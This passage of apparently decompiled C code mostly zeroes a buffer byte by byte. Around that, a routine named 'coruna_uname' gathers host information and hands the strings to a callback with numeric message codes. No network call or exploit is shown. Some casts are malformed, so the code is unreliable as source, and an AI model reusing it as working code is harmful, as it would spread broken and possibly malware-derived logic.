            stack_guard[0x15a] = '\0';
            stack_guard[0x15b] = '\0';
            stack_guard[0x15c] = '\0';
            stack_guard[0x15d] = '\0';
            stack_guard[0x15e] = '\0';
            stack_guard[0x15f] = '\0';
            stack_guard[0x150] = '\0';
            stack_guard[0x151] = '\0';
            stack_guard[0x152] = '\0';
            stack_guard[0x153] = '\0';
            stack_guard[0x154] = '\0';
            stack_guard[0x155] = '\0';
            stack_guard[0x156] = '\0';
            stack_guard[0x157] = '\0';
            stack_guard[0x128] = '\0';
            stack_guard[0x129] = '\0';
            stack_guard[0x12a] = '\0';
            stack_guard[299] = '\0';
            stack_guard[300] = '\0';
            stack_guard[0x12d] = '\0';
            stack_guard[0x12e] = '\0';
            stack_guard[0x12f] = '\0';
            stack_guard[0x120] = '\0';
            stack_guard[0x121] = '\0';
            stack_guard[0x122] = '\0';
            stack_guard[0x123] = '\0';
            stack_guard[0x124] = '\0';
            stack_guard[0x125] = '\0';
            stack_guard[0x126] = '\0';
            stack_guard[0x127] = '\0';
            stack_guard[0x138] = '\0';
            stack_guard[0x139] = '\0';
            stack_guard[0x13a] = '\0';
            stack_guard[0x13b] = '\0';
            stack_guard[0x13c] = '\0';
            stack_guard[0x13d] = '\0';
            stack_guard[0x13e] = '\0';
            stack_guard[0x13f] = '\0';
            stack_guard[0x130] = '\0';
            stack_guard[0x131] = '\0';
            stack_guard[0x132] = '\0';
            stack_guard[0x133] = '\0';
            stack_guard[0x134] = '\0';
            stack_guard[0x135] = '\0';
            stack_guard[0x136] = '\0';
            stack_guard[0x137] = '\0';
            stack_guard[0x108] = '\0';
            stack_guard[0x109] = '\0';
            stack_guard[0x10a] = '\0';
            stack_guard[0x10b] = '\0';
            stack_guard[0x10c] = '\0';
            stack_guard[0x10d] = '\0';
            stack_guard[0x10e] = '\0';
            stack_guard[0x10f] = '\0';
            stack_guard[0x100] = '\0';
            stack_guard[0x101] = '\0';
            stack_guard[0x102] = '\0';
            stack_guard[0x103] = '\0';
            stack_guard[0x104] = '\0';
            stack_guard[0x105] = '\0';
            stack_guard[0x106] = '\0';
            stack_guard[0x107] = '\0';
            stack_guard[0x118] = '\0';
            stack_guard[0x119] = '\0';
            stack_guard[0x11a] = '\0';
            stack_guard[0x11b] = '\0';
            stack_guard[0x11c] = '\0';
            stack_guard[0x11d] = '\0';
            stack_guard[0x11e] = '\0';
            stack_guard[0x11f] = '\0';
            stack_guard[0x110] = '\0';
            stack_guard[0x111] = '\0';
            stack_guard[0x112] = '\0';
            stack_guard[0x113] = '\0';
            stack_guard[0x114] = '\0';
            stack_guard[0x115] = '\0';
            stack_guard[0x116] = '\0';
            stack_guard[0x117] = '\0';
            stack_guard[0xe8] = '\0';
            stack_guard[0xe9] = '\0';
            stack_guard[0xea] = '\0';
            stack_guard[0xeb] = '\0';
            stack_guard[0xec] = '\0';
            stack_guard[0xed] = '\0';
            stack_guard[0xee] = '\0';
            stack_guard[0xef] = '\0';
            stack_guard[0xe0] = '\0';
            stack_guard[0xe1] = '\0';
            stack_guard[0xe2] = '\0';
            stack_guard[0xe3] = '\0';
            stack_guard[0xe4] = '\0';
            stack_guard[0xe5] = '\0';
            stack_guard[0xe6] = '\0';
            stack_guard[0xe7] = '\0';
            stack_guard[0xf8] = '\0';
            stack_guard[0xf9] = '\0';
            stack_guard[0xfa] = '\0';
            stack_guard[0xfb] = '\0';
            stack_guard[0xfc] = '\0';
            stack_guard[0xfd] = '\0';
            stack_guard[0xfe] = '\0';
            stack_guard[0xff] = '\0';
            stack_guard[0xf0] = '\0';
            stack_guard[0xf1] = '\0';
            stack_guard[0xf2] = '\0';
            stack_guard[0xf3] = '\0';
            stack_guard[0xf4] = '\0';
            stack_guard[0xf5] = '\0';
            stack_guard[0xf6] = '\0';
            stack_guard[0xf7] = '\0';
            stack_guard[200] = '\0';
            stack_guard[0xc9] = '\0';
            stack_guard[0xca] = '\0';
            stack_guard[0xcb] = '\0';
            stack_guard[0xcc] = '\0';
            stack_guard[0xcd] = '\0';
            stack_guard[0xce] = '\0';
            stack_guard[0xcf] = '\0';
            stack_guard[0xc0] = '\0';
            stack_guard[0xc1] = '\0';
            stack_guard[0xc2] = '\0';
            stack_guard[0xc3] = '\0';
            stack_guard[0xc4] = '\0';
            stack_guard[0xc5] = '\0';
            stack_guard[0xc6] = '\0';
            stack_guard[199] = '\0';
            stack_guard[0xd8] = '\0';
            stack_guard[0xd9] = '\0';
            stack_guard[0xda] = '\0';
            stack_guard[0xdb] = '\0';
            stack_guard[0xdc] = '\0';
            stack_guard[0xdd] = '\0';
            stack_guard[0xde] = '\0';
            stack_guard[0xdf] = '\0';
            stack_guard[0xd0] = '\0';
            stack_guard[0xd1] = '\0';
            stack_guard[0xd2] = '\0';
            stack_guard[0xd3] = '\0';
            stack_guard[0xd4] = '\0';
            stack_guard[0xd5] = '\0';
            stack_guard[0xd6] = '\0';
            stack_guard[0xd7] = '\0';
            stack_guard[0xa8] = '\0';
            stack_guard[0xa9] = '\0';
            stack_guard[0xaa] = '\0';
            stack_guard[0xab] = '\0';
            stack_guard[0xac] = '\0';
            stack_guard[0xad] = '\0';
            stack_guard[0xae] = '\0';
            stack_guard[0xaf] = '\0';
            stack_guard[0xa0] = '\0';
            stack_guard[0xa1] = '\0';
            stack_guard[0xa2] = '\0';
            stack_guard[0xa3] = '\0';
            stack_guard[0xa4] = '\0';
            stack_guard[0xa5] = '\0';
            stack_guard[0xa6] = '\0';
            stack_guard[0xa7] = '\0';
            stack_guard[0xb8] = '\0';
            stack_guard[0xb9] = '\0';
            stack_guard[0xba] = '\0';
            stack_guard[0xbb] = '\0';
            stack_guard[0xbc] = '\0';
            stack_guard[0xbd] = '\0';
            stack_guard[0xbe] = '\0';
            stack_guard[0xbf] = '\0';
            stack_guard[0xb0] = '\0';
            stack_guard[0xb1] = '\0';
            stack_guard[0xb2] = '\0';
            stack_guard[0xb3] = '\0';
            stack_guard[0xb4] = '\0';
            stack_guard[0xb5] = '\0';
            stack_guard[0xb6] = '\0';
            stack_guard[0xb7] = '\0';
            stack_guard[0x88] = '\0';
            stack_guard[0x89] = '\0';
            stack_guard[0x8a] = '\0';
            stack_guard[0x8b] = '\0';
            stack_guard[0x8c] = '\0';
            stack_guard[0x8d] = '\0';
            stack_guard[0x8e] = '\0';
            stack_guard[0x8f] = '\0';
            stack_guard[0x80] = '\0';
            stack_guard[0x81] = '\0';
            stack_guard[0x82] = '\0';
            stack_guard[0x83] = '\0';
            stack_guard[0x84] = '\0';
            stack_guard[0x85] = '\0';
            stack_guard[0x86] = '\0';
            stack_guard[0x87] = '\0';
            stack_guard[0x98] = '\0';
            stack_guard[0x99] = '\0';
            stack_guard[0x9a] = '\0';
            stack_guard[0x9b] = '\0';
            stack_guard[0x9c] = '\0';
            stack_guard[0x9d] = '\0';
            stack_guard[0x9e] = '\0';
            stack_guard[0x9f] = '\0';
            stack_guard[0x90] = '\0';
            stack_guard[0x91] = '\0';
            stack_guard[0x92] = '\0';
            stack_guard[0x93] = '\0';
            stack_guard[0x94] = '\0';
            stack_guard[0x95] = '\0';
            stack_guard[0x96] = '\0';
            stack_guard[0x97] = '\0';
            stack_guard[0x68] = '\0';
            stack_guard[0x69] = '\0';
            stack_guard[0x6a] = '\0';
            stack_guard[0x6b] = '\0';
            stack_guard[0x6c] = '\0';
            stack_guard[0x6d] = '\0';
            stack_guard[0x6e] = '\0';
            stack_guard[0x6f] = '\0';
            stack_guard[0x60] = '\0';
            stack_guard[0x61] = '\0';
            stack_guard[0x62] = '\0';
            stack_guard[99] = '\0';
            stack_guard[100] = '\0';
            stack_guard[0x65] = '\0';
            stack_guard[0x66] = '\0';
            stack_guard[0x67] = '\0';
            stack_guard[0x78] = '\0';
            stack_guard[0x79] = '\0';
            stack_guard[0x7a] = '\0';
            stack_guard[0x7b] = '\0';
            stack_guard[0x7c] = '\0';
            stack_guard[0x7d] = '\0';
            stack_guard[0x7e] = '\0';
            stack_guard[0x7f] = '\0';
            stack_guard[0x70] = '\0';
            stack_guard[0x71] = '\0';
            stack_guard[0x72] = '\0';
            stack_guard[0x73] = '\0';
            stack_guard[0x74] = '\0';
            stack_guard[0x75] = '\0';
            stack_guard[0x76] = '\0';
            stack_guard[0x77] = '\0';
            stack_guard[0x58] = '\0';
            stack_guard[0x59] = '\0';
            stack_guard[0x5a] = '\0';
            stack_guard[0x5b] = '\0';
            stack_guard[0x5c] = '\0';
            stack_guard[0x5d] = '\0';
            stack_guard[0x5e] = '\0';
            stack_guard[0x5f] = '\0';
            stack_guard[0x50] = '\0';
            stack_guard[0x51] = '\0';
            stack_guard[0x52] = '\0';
            stack_guard[0x53] = '\0';
            stack_guard[0x54] = '\0';
            stack_guard[0x55] = '\0';
            stack_guard[0x56] = '\0';
            stack_guard[0x57] = '\0';
            stack_guard[0x38] = '\0';
            stack_guard[0x39] = '\0';
            stack_guard[0x3a] = '\0';
            stack_guard[0x3b] = '\0';
            stack_guard[0x3c] = '\0';
            stack_guard[0x3d] = '\0';
            stack_guard[0x3e] = '\0';
            stack_guard[0x3f] = '\0';
            stack_guard[0x30] = '\0';
            stack_guard[0x31] = '\0';
            stack_guard[0x32] = '\0';
            stack_guard[0x33] = '\0';
            stack_guard[0x34] = '\0';
            stack_guard[0x35] = '\0';
            stack_guard[0x36] = '\0';
            stack_guard[0x37] = '\0';
            stack_guard[0x48] = '\0';
            stack_guard[0x49] = '\0';
            stack_guard[0x4a] = '\0';
            stack_guard[0x4b] = '\0';
            stack_guard[0x4c] = '\0';
            stack_guard[0x4d] = '\0';
            stack_guard[0x4e] = '\0';
            stack_guard[0x4f] = '\0';
            stack_guard[0x40] = '\0';
            stack_guard[0x41] = '\0';
            stack_guard[0x42] = '\0';
            stack_guard[0x43] = '\0';
            stack_guard[0x44] = '\0';
            stack_guard[0x45] = '\0';
            stack_guard[0x46] = '\0';
            stack_guard[0x47] = '\0';
            stack_guard[0x18] = '\0';
            stack_guard[0x19] = '\0';
            stack_guard[0x1a] = '\0';
            stack_guard[0x1b] = '\0';
            stack_guard[0x1c] = '\0';
            stack_guard[0x1d] = '\0';
            stack_guard[0x1e] = '\0';
            stack_guard[0x1f] = '\0';
            stack_guard[0x10] = '\0';
            stack_guard[0x11] = '\0';
            stack_guard[0x12] = '\0';
            stack_guard[0x13] = '\0';
            stack_guard[0x14] = '\0';
            stack_guard[0x15] = '\0';
            stack_guard[0x16] = '\0';
            stack_guard[0x17] = '\0';
            stack_guard[0x28] = '\0';
            stack_guard[0x29] = '\0';
            stack_guard[0x2a] = '\0';
            stack_guard[0x2b] = '\0';
            stack_guard[0x2c] = '\0';
            stack_guard[0x2d] = '\0';
            stack_guard[0x2e] = '\0';
            stack_guard[0x2f] = '\0';
            stack_guard[0x20] = '\0';
            stack_guard[0x21] = '\0';
            stack_guard[0x22] = '\0';
            stack_guard[0x23] = '\0';
            stack_guard[0x24] = '\0';
            stack_guard[0x25] = '\0';
            stack_guard[0x26] = '\0';
            stack_guard[0x27] = '\0';
            stack_guard[8] = '\0';
            stack_guard[9] = '\0';
            stack_guard[10] = '\0';
            stack_guard[0xb] = '\0';
            stack_guard[0xc] = '\0';
            stack_guard[0xd] = '\0';
            stack_guard[0xe] = '\0';
            stack_guard[0xf] = '\0';
            stack_guard[0] = '\0';
            stack_guard[1] = '\0';
            stack_guard[2] = '\0';
            stack_guard[3] = '\0';
            stack_guard[4] = '\0';
            stack_guard[5] = '\0';
            stack_guard[6] = '\0';
            stack_guard[7] = '\0';
            block_ctx = 0;
            port = coruna_uname(arg,host_info,thread_attr,stack_guard,0x200,&block_ctx);
            if ((int)port == 0) {
              ptr = _strdup(stack_guard);
              if (ptr == (char *)0x0) {
                port = 0xad009;
              }
              else {
                buf = *(void (**)(arg + 0xe8);
                ls7 = _strlen(ptr);
                port = (*buf)(arg,0x70001,ptr,(int)ls7 + 1);
                if (((int)port == 0) &&
                   (port = (**(void (**)(arg + 0xe8))(arg,0x70002,block_ctx,0x20),
                   (int)port == 0)) {
                  str = *(char **)(arg + 0x78);
                  if (str != (char *)0x0) {
                    buf = *(void (**)(arg + 0xe8);
                    ls7 = _strlen(str);
                    port = (*buf)(arg,0x70003,str,(int)ls7 + 1);
                    if ((int)port != 0) goto next;
                  }
                  str = *(char **)(arg + 0xa0);
                  if (str != (char *)0x0) {
                    buf = *(void (**)(arg + 0xe8);
                    ls7 = _strlen(str);
                    port = (*buf)(arg,0x70004,str,(int)ls7 + 1);
                    if ((int)port != 0) goto next;
                  }
                  str = *(char **)(arg + 0xa8);
                  if (str != (char *)0x0) {
                    buf = *(void (**)(arg + 0xe8);
                    ls7 = _strlen(str);
                    size = (*buf)(arg,0x70006,str,(int)ls7 + 1);
                    version = 0;
                    if (size != 0x7004) {
                      version = size;
                    }
                    port = (unsigned long)version;
                    if (version != 0) goto next;
                  }
                  port = 0;
                  *n = action;
                  *m = serial_buf;
                  goto retry;
                }
next:
                ls7 = _strlen(ptr);
                _bzero(ptr,ls7);
                _free(ptr);
              }
            }
          }
          _bzero(action,(unsigned long)serial_buf);
          _free(action);
        }
      }
retry:
      if ((int)port == 0x30001) {
        stack_guard[0x1e8] = '\0';
        stack_guard[0x1e9] = '\0';
        stack_guard[0x1ea] = '\0';
        stack_guard[0x1eb] = '\0';
        stack_guard[0x1ec] = '\0';
        stack_guard[0x1ed] = '\0';
        stack_guard[0x1ee] = '\0';
        stack_guard[0x1ef] = '\0';
        stack_guard[0x1e0] = '\0';
        stack_guard[0x1e1] = '\0';
        stack_guard[0x1e2] = '\0';
        stack_guard[0x1e3] = '\0';
        stack_guard[0x1e4] = '\0';
        stack_guard[0x1e5] = '\0';
        stack_guard[0x1e6] = '\0';
        stack_guard[0x1e7] = '\0';
        stack_guard[0x1f8] = '\0';
        stack_guard[0x1f9] = '\0';
        stack_guard[0x1fa] = '\0';
        stack_guard[0x1fb] = '\0';
        stack_guard[0x1fc] = '\0';
        stack_guard[0x1fd] = '\0';
        stack_guard[0x1fe] = '\0';
        stack_guard[0x1ff] = '\0';
        stack_guard[0x1f0] = '\0';
        stack_guard[0x1f1] = '\0';
        stack_guard[0x1f2] = '\0';
        stack_guard[499] = '\0';
        stack_guard[500] = '\0';
        stack_guard[0x1f5] = '\0';
        stack_guard[0x1f6] = '\0';
        stack_guard[0x1f7] = '\0';
        stack_guard[0x1c8] = '\0';
        stack_guard[0x1c9] = '\0';
        stack_guard[0x1ca] = '\0';
        stack_guard[0x1cb] = '\0';
        stack_guard[0x1cc] = '\0';
        stack_guard[0x1cd] = '\0';
        stack_guard[0x1ce] = '\0';
        stack_guard[0x1cf] = '\0';
        stack_guard[0x1c0] = '\0';
        stack_guard[0x1c1] = '\0';
        stack_guard[0x1c2] = '\0';
        stack_guard[0x1c3] = '\0';
        stack_guard[0x1c4] = '\0';
        stack_guard[0x1c5] = '\0';
        stack_guard[0x1c6] = '\0';
        stack_guard[0x1c7] = '\0';
        stack_guard[0x1d8] = '\0';
        stack_guard[0x1d9] = '\0';
        stack_guard[0x1da] = '\0';
        stack_guard[0x1db] = '\0';
        stack_guard[0x1dc] = '\0';
        stack_guard[0x1dd] = '\0';
        stack_guard[0x1de] = '\0';
        stack_guard[0x1df] = '\0';
        stack_guard[0x1d0] = '\0';
        stack_guard[0x1d1] = '\0';
        stack_guard[0x1d2] = '\0';
        stack_guard[0x1d3] = '\0';
        stack_guard[0x1d4] = '\0';
        stack_guard[0x1d5] = '\0';
        stack_guard[0x1d6] = '\0';
        stack_guard[0x1d7] = '\0';
        stack_guard[0x1a8] = '\0';
        stack_guard[0x1a9] = '\0';
        stack_guard[0x1aa] = '\0';
        stack_guard[0x1ab] = '\0';
        stack_guard[0x1ac] = '\0';
        stack_guard[0x1ad] = '\0';
        stack_guard[0x1ae] = '\0';
        stack_guard[0x1af] = '\0';
        stack_guard[0x1a0] = '\0';
        stack_guard[0x1a1] = '\0';
        stack_guard[0x1a2] = '\0';
        stack_guard[0x1a3] = '\0';
        stack_guard[0x1a4] = '\0';
        stack_guard[0x1a5] = '\0';
        stack_guard[0x1a6] = '\0';
        stack_guard[0x1a7] = '\0';
        stack_guard[0x1b8] = '\0';
        stack_guard[0x1b9] = '\0';
        stack_guard[0x1ba] = '\0';
        stack_guard[0x1bb] = '\0';
        stack_guard[0x1bc] = '\0';
        stack_guard[0x1bd] = '\0';
        stack_guard[0x1be] = '\0';
        stack_guard[0x1bf] = '\0';
        stack_guard[0x1b0] = '\0';
        stack_guard[0x1b1] = '\0';
        stack_guard[0x1b2] = '\0';
        stack_guard[0x1b3] = '\0';
        stack_guard[0x1b4] = '\0';
        stack_guard[0x1b5] = '\0';
        stack_guard[0x1b6] = '\0';
        stack_guard[0x1b7] = '\0';
        stack_guard[0x188] = '\0';
        stack_guard[0x189] = '\0';
        stack_guard[0x18a] = '\0';
        stack_guard[0x18b] = '\0';
        stack_guard[0x18c] = '\0';
        stack_guard[0x18d] = '\0';
        stack_guard[0x18e] = '\0';
        stack_guard[399] = '\0';
        stack_guard[0x180] = '\0';
        stack_guard[0x181] = '\0';
        stack_guard[0x182] = '\0';
        stack_guard[0x183] = '\0';
        stack_guard[0x184] = '\0';
        stack_guard[0x185] = '\0';
        stack_guard[0x186] = '\0';
        stack_guard[0x187] = '\0';
        stack_guard[0x198] = '\0';
        stack_guard[0x199] = '\0';
        stack_guard[0x19a] = '\0';
        stack_guard[0x19b] = '\0';
        stack_guard[0x19c] = '\0';
        stack_guard[0x19d] = '\0';
        stack_guard[0x19e] = '\0';
        stack_guard[0x19f] = '\0';
        stack_guard[400] = '\0';
        stack_guard[0x191] = '\0';
        stack_guard[0x192] = '\0';
        stack_guard[0x193] = '\0';
        stack_guard[0x194] = '\0';
        stack_guard[0x195] = '\0';
        stack_guard[0x196] = '\0';
        stack_guard[0x197] = '\0';
        stack_guard[0x168] = '\0';
        stack_guard[0x169] = '\0';
        stack_guard[0x16a] = '\0';
        stack_guard[0x16b] = '\0';
        stack_guard[0x16c] = '\0';
        stack_guard[0x16d] = '\0';
        stack_guard[0x16e] = '\0';
        stack_guard[0x16f] = '\0';
        stack_guard[0x160] = '\0';
        stack_guard[0x161] = '\0';
        stack_guard[0x162] = '\0';
        stack_guard[0x163] = '\0';
        stack_guard[0x164] = '\0';
        stack_guard[0x165] = '\0';
        stack_guard[0x166] = '\0';
        stack_guard[0x167] = '\0';
        stack_guard[0x178] = '\0';
        stack_guard[0x179] = '\0';
        stack_guard[0x17a] = '\0';
        stack_guard[0x17b] = '\0';
        stack_guard[0x17c] = '\0';
        stack_guard[0x17d] = '\0';
        stack_guard[0x17e] = '\0';
        stack_guard[0x17f] = '\0';
        stack_guard[0x170] = '\0';
        stack_guard[0x171] = '\0';
        stack_guard[0x172] = '\0';
        stack_guard[0x173] = '\0';
        stack_guard[0x174] = '\0';
        stack_guard[0x175] = '\0';
        stack_guard[0x176] = '\0';
        stack_guard[0x177] = '\0';
        stack_guard[0x148] = '\0';
        stack_guard[0x149] = '\0';
        stack_guard[0x14a] = '\0';
        stack_guard[0x14b] = '\0';
        stack_guard[0x14c] = '\0';
        stack_guard[0x14d] = '\0';
        stack_guard[0x14e] = '\0';
        stack_guard[0x14f] = '\0';
        stack_guard[0x140] = '\0';
        stack_guard[0x141] = '\0';
        stack_guard[0x142] = '\0';
        stack_guard[0x143] = '\0';
        stack_guard[0x144] = '\0';
        stack_guard[0x145] = '\0';
        stack_guard[0x146] = '\0';
        stack_guard[0x147] = '\0';
        stack_guard[0x158] = '\0';
        stack_guard[0x159] = '\0';
        stack_guard[0x15a] = '\0';
        stack_guard[0x15b] = '\0';
        stack_guard[0x15c] = '\0';
        stack_guard[0x15d] = '\0';
        stack_guard[0x15e] = '\0';
        stack_guard[0x15f] = '\0';
        stack_guard[0x150] = '\0';
        stack_guard[0x151] = '\0';
        stack_guard[0x152] = '\0';
        stack_guard[0x153] = '\0';
        stack_guard[0x154] = '\0';
        stack_guard[0x155] = '\0';
        stack_guard[0x156] = '\0';
        stack_guard[0x157] = '\0';
        stack_guard[0x128] = '\0';
        stack_guard[0x129] = '\0';
        stack_guard[0x12a] = '\0';
        stack_guard[299] = '\0';
        stack_guard[300] = '\0';
        stack_guard[0x12d] = '\0';
        stack_guard[0x12e] = '\0';
        stack_guard[0x12f] = '\0';
        stack_guard[0x120] = '\0';
        stack_guard[0x121] = '\0';
        stack_guard[0x122] = '\0';
        stack_guard[0x123] = '\0';
        stack_guard[0x124] = '\0';
        stack_guard[0x125] = '\0';
        stack_guard[0x126] = '\0';
        stack_guard[0x127] = '\0';
        stack_guard[0x138] = '\0';
        stack_guard[0x139] = '\0';
        stack_guard[0x13a] = '\0';
        stack_guard[0x13b] = '\0';
        stack_guard[0x13c] = '\0';
        stack_guard[0x13d] = '\0';
        stack_guard[0x13e] = '\0';
        stack_guard[0x13f] = '\0';
        stack_guard[0x130] = '\0';
        stack_guard[0x131] = '\0';
        stack_guard[0x132] = '\0';
        stack_guard[0x133] = '\0';
        stack_guard[0x134] = '\0';
        stack_guard[0x135] = '\0';
        stack_guard[0x136] = '\0';
        stack_guard[0x137] = '\0';
        stack_guard[0x108] = '\0';
        stack_guard[0x109] = '\0';
        stack_guard[0x10a] = '\0';
        stack_guard[0x10b] = '\0';
        stack_guard[0x10c] = '\0';
        stack_guard[0x10d] = '\0';
        stack_guard[0x10e] = '\0';
        stack_guard[0x10f] = '\0';
        stack_guard[0x100] = '\0';
        stack_guard[0x101] = '\0';
        stack_guard[0x102] = '\0';
        stack_guard[0x103] = '\0';
        stack_guard[0x104] = '\0';
        stack_guard[0x105] = '\0';
        stack_guard[0x106] = '\0';
        stack_guard[0x107] = '\0';
        stack_guard[0x118] = '\0';
        stack_guard[0x119] = '\0';
        stack_guard[0x11a] = '\0';
        stack_guard[0x11b] = '\0';
        stack_guard[0x11c] = '\0';
        stack_guard[0x11d] = '\0';
        stack_guard[0x11e] = '\0';
        stack_guard[0x11f] = '\0';
        stack_guard[0x110] = '\0';
        stack_guard[0x111] = '\0';
        stack_guard[0x112] = '\0';
        stack_guard[0x113] = '\0';
        stack_guard[0x114] = '\0';
        stack_guard[0x115] = '\0';
        stack_guard[0x116] = '\0';
        stack_guard[0x117] = '\0';
        stack_guard[0xe8] = '\0';
        stack_guard[0xe9] = '\0';
        stack_guard[0xea] = '\0';
        stack_guard[0xeb] = '\0';
        stack_guard[0xec] = '\0';
        stack_guard[0xed] = '\0';
        stack_guard[0xee] = '\0';
        stack_guard[0xef] = '\0';
        stack_guard[0xe0] = '\0';
        stack_guard[0xe1] = '\0';
        stack_guard[0xe2] = '\0';
        stack_guard[0xe3] = '\0';
        stack_guard[0xe4] = '\0';
        stack_guard[0xe5] = '\0';
        stack_guard[0xe6] = '\0';
        stack_guard[0xe7] = '\0';
        stack_guard[0xf8] = '\0';
        stack_guard[0xf9] = '\0';
        stack_guard[0xfa] = '\0';
        stack_guard[0xfb] = '\0';
        stack_guard[0xfc] = '\0';
        stack_guard[0xfd] = '\0';
        stack_guard[0xfe] = '\0';
        stack_guard[0xff] = '\0';
        stack_guard[0xf0] = '\0';
        stack_guard[0xf1] = '\0';
        stack_guard[0xf2] = '\0';
        stack_guard[0xf3] = '\0';
        stack_guard[0xf4] = '\0';
        stack_guard[0xf5] = '\0';
        stack_guard[0xf6] = '\0';
        stack_guard[0xf7] = '\0';
        stack_guard[200] = '\0';
        stack_guard[0xc9] = '\0';
        stack_guard[0xca] = '\0';
        stack_guard[0xcb] = '\0';
        stack_guard[0xcc] = '\0';
        stack_guard[0xcd] = '\0';
        stack_guard[0xce] = '\0';
        stack_guard[0xcf] = '\0';
        stack_guard[0xc0] = '\0';
        stack_guard[0xc1] = '\0';
        stack_guard[0xc2] = '\0';
        stack_guard[0xc3] = '\0';
        stack_guard[0xc4] = '\0';
        stack_guard[0xc5] = '\0';
        stack_guard[0xc6] = '\0';
        stack_guard[199] = '\0';
        stack_guard[0xd8] = '\0';
        stack_guard[0xd9] = '\0';
        stack_guard[0xda] = '\0';
        stack_guard[0xdb] = '\0';
        stack_guard[0xdc] = '\0';
        stack_guard[0xdd] = '\0';
        stack_guard[0xde] = '\0';
        stack_guard[0xdf] = '\0';
        stack_guard[0xd0] = '\0';
        stack_guard[0xd1] = '\0';
        stack_guard[0xd2] = '\0';
        stack_guard[0xd3] = '\0';
        stack_guard[0xd4] = '\0';
        stack_guard[0xd5] = '\0';
        stack_guard[0xd6] = '\0';
        stack_guard[0xd7] = '\0';
        stack_guard[0xa8] = '\0';
        stack_guard[0xa9] = '\0';
        stack_guard[0xaa] = '\0';
        stack_guard[0xab] = '\0';
        stack_guard[0xac] = '\0';
        stack_guard[0xad] = '\0';
        stack_guard[0xae] = '\0';
        stack_guard[0xaf] = '\0';
        stack_guard[0xa0] = '\0';
        stack_guard[0xa1] = '\0';
        stack_guard[0xa2] = '\0';
        stack_guard[0xa3] = '\0';
        stack_guard[0xa4] = '\0';
        stack_guard[0xa5] = '\0';
        stack_guard[0xa6] = '\0';
        stack_guard[0xa7] = '\0';
        stack_guard[0xb8] = '\0';
        stack_guard[0xb9] = '\0';
        stack_guard[0xba] = '\0';
        stack_guard[0xbb] = '\0';
        stack_guard[0xbc] = '\0';
        stack_guard[0xbd] = '\0';
        stack_guard[0xbe] = '\0';
        stack_guard[0xbf] = '\0';
        stack_guard[0xb0] = '\0';
        stack_guard[0xb1] = '\0';
        stack_guard[0xb2] = '\0';
        stack_guard[0xb3] = '\0';
        stack_guard[0xb4] = '\0';
        stack_guard[0xb5] = '\0';
        stack_guard[0xb6] = '\0';
        stack_guard[0xb7] = '\0';
        stack_guard[0x88] = '\0';
        stack_guard[0x89] = '\0';
        stack_guard[0x8a] = '\0';
        stack_guard[0x8b] = '\0';
        stack_guard[0x8c] = '\0';
        stack_guard[0x8d] = '\0';
        stack_guard[0x8e] = '\0';
        stack_guard[0x8f] = '\0';
        stack_guard[0x80] = '\0';
        stack_guard[0x81] = '\0';
        stack_guard[0x82] = '\0';
        stack_guard[0x83] = '\0';
        stack_guard[0x84] = '\0';
        stack_guard[0x85] = '\0';
        stack_guard[0x86] = '\0';
        stack_guard[0x87] = '\0';
        stack_guard[0x98] = '\0';
        stack_guard[0x99] = '\0';
        stack_guard[0x9a] = '\0';
        stack_guard[0x9b] = '\0';
        stack_guard[0x9c] = '\0';
        stack_guard[0x9d] = '\0';
        stack_guard[0x9e] = '\0';
        stack_guard[0x9f] = '\0';
        stack_guard[0x90] = '\0';
        stack_guard[0x91] = '\0';
        stack_guard[0x92] = '\0';
        stack_guard[0x93] = '\0';
        stack_guard[0x94] = '\0';
        stack_guard[0x95] = '\0';
        stack_guard[0x96] = '\0';
        stack_guard[0x97] = '\0';
        stack_guard[0x68] = '\0';
        stack_guard[0x69] = '\0';
        stack_guard[0x6a] = '\0';
        stack_guard[0x6b] = '\0';
        stack_guard[0x6c] = '\0';
        stack_guard[0x6d] = '\0';
        stack_guard[0x6e] = '\0';
        stack_guard[0x6f] = '\0';
        stack_guard[0x60] = '\0';
        stack_guard[0x61] = '\0';
        stack_guard[0x62] = '\0';
        stack_guard[99] = '\0';
        stack_guard[100] = '\0';
        stack_guard[0x65] = '\0';
        stack_guard[0x66] = '\0';
        stack_guard[0x67] = '\0';
        stack_guard[0x78] = '\0';
        stack_guard[0x79] = '\0';
        stack_guard[0x7a] = '\0';
        stack_guard[0x7b] = '\0';
        stack_guard[0x7c] = '\0';
        stack_guard[0x7d] = '\0';
        stack_guard[0x7e] = '\0';
        stack_guard[0x7f] = '\0';
        stack_guard[0x70] = '\0';
        stack_guard[0x71] = '\0';
        stack_guard[0x72] = '\0';
        stack_guard[0x73] = '\0';
        stack_guard[0x74] = '\0';
        stack_guard[0x75] = '\0';
        stack_guard[0x76] = '\0';
        stack_guard[0x77] = '\0';
        stack_guard[0x58] = '\0';
        stack_guard[0x59] = '\0';
        stack_guard[0x5a] = '\0';
        stack_guard[0x5b] = '\0';
        stack_guard[0x5c] = '\0';
        stack_guard[0x5d] = '\0';
        stack_guard[0x5e] = '\0';
        stack_guard[0x5f] = '\0';
        stack_guard[0x50] = '\0';
        stack_guard[0x51] = '\0';
        stack_guard[0x52] = '\0';
        stack_guard[0x53] = '\0';
        stack_guard[0x54] = '\0';
        stack_guard[0x55] = '\0';
        stack_guard[0x56] = '\0';
        stack_guard[0x57] = '\0';
        stack_guard[0x38] = '\0';
        stack_guard[0x39] = '\0';
        stack_guard[0x3a] = '\0';
        stack_guard[0x3b] = '\0';
        stack_guard[0x3c] = '\0';
        stack_guard[0x3d] = '\0';
        stack_guard[0x3e] = '\0';
        stack_guard[0x3f] = '\0';
        stack_guard[0x30] = '\0';
        stack_guard[0x31] = '\0';
        stack_guard[0x32] = '\0';
        stack_guard[0x33] = '\0';
        stack_guard[0x34] = '\0';
        stack_guard[0x35] = '\0';
        stack_guard[0x36] = '\0';
        stack_guard[0x37] = '\0';
        stack_guard[0x48] = '\0';
        stack_guard[0x49] = '\0';
        stack_guard[0x4a] = '\0';
        stack_guard[0x4b] = '\0';
        stack_guard[0x4c] = '\0';
        stack_guard[0x4d] = '\0';
        stack_guard[0x4e] = '\0';
        stack_guard[0x4f] = '\0';
        stack_guard[0x40] = '\0';
        stack_guard[0x41] = '\0';
        stack_guard[0x42] = '\0';
        stack_guard[0x43] = '\0';
        stack_guard[0x44] = '\0';
        stack_guard[0x45] = '\0';
        stack_guard[0x46] = '\0';
        stack_guard[0x47] = '\0';
        stack_guard[0x18] = '\0';
        stack_guard[0x19] = '\0';
        stack_guard[0x1a] = '\0';
        stack_guard[0x1b] = '\0';
        stack_guard[0x1c] = '\0';
        stack_guard[0x1d] = '\0';
        stack_guard[0x1e] = '\0';
        stack_guard[0x1f] = '\0';
